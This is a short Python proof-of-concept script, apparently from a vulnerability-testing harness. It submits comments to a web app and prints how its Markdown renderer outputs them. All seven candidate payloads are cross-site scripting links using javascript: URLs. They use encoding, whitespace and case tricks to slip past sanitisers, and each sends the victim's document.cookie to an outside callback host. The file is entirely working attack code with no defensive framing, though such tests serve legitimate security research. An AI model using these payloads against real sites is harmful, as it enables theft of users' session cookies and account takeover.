import sys, urllib.parse, urllib.request
sys.path.insert(0, '.')
from poc_common import HOST_APP, CB

def render(comment):
    body = urllib.parse.urlencode({"c": comment}).encode()
    req = urllib.request.Request(HOST_APP["v1"]+"/comment", data=body, method="POST")
    urllib.request.urlopen(req, timeout=30).read()
    html = urllib.request.urlopen(HOST_APP["v1"]+"/", timeout=30).read().decode("utf-8","replace")
    import re
    m = re.search(r'<div id="comments">(.*?)</div>', html, re.S)
    return m.group(1) if m else html

cands = {
 "A inline-md": "[CLICKME]("+ "javascript:document.location='" + CB + "'+document.cookie)",
 "B ref-style": "[CLICKME][r]\n\n[r]: " + "javascript:document.location='" + CB + "'+document.cookie",
 "C entity-scheme": "[CLICKME](&#106;avascript:document.location='" + CB + "'+document.cookie)",
 "D nl-scheme": "[CLICKME](java\nscript:document.location='" + CB + "'+document.cookie)",
 "E tab-scheme": "[CLICKME](java\tscript:document.location='" + CB + "'+document.cookie)",
 "F upper-scheme": "[CLICKME](" + "JAVASCRIPT:document.location='" + CB + "'+document.cookie)",
 "G autolink": "<" + "javascript:document.location='" + CB + "'+document.cookie" + ">",
}
for k,v in cands.items():
    print("=====", k, "=====")
    print(render(v))
